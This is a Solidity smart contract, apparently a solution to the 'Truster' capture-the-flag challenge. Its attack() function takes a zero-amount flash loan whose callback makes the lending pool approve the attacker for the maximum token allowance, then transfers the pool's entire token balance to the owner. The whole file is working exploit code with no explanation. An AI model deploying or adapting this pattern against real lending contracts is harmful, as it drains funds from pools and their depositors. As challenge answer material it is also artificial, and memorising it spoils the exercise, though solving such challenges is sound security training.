// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Pool {
    function flashLoan(
        uint256 borrowAmount, 
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

interface Token {
    function transferFrom(address from, address to, uint256 amount) external;
    function balanceOf(address holder) external returns(uint256);
}

contract TrusterAttacker {
    Pool public pool;
    Token public token;
    address public owner;

    uint256 public constant BORROW_AMOUNT = 0;

    constructor (address _pool, address _token) {
        require(_pool != address(0), "invalid pool address");
        require(_token != address(0), "invalid token address");
        pool = Pool(_pool);
        token = Token(_token);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "only owner");

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", 
            address(this),
            type(uint).max
        );

        pool.flashLoan(
            BORROW_AMOUNT,
            address(this),
            address(token),
            data
        );

        token.transferFrom(address(pool), owner, token.balanceOf(address(pool)));
    }
}
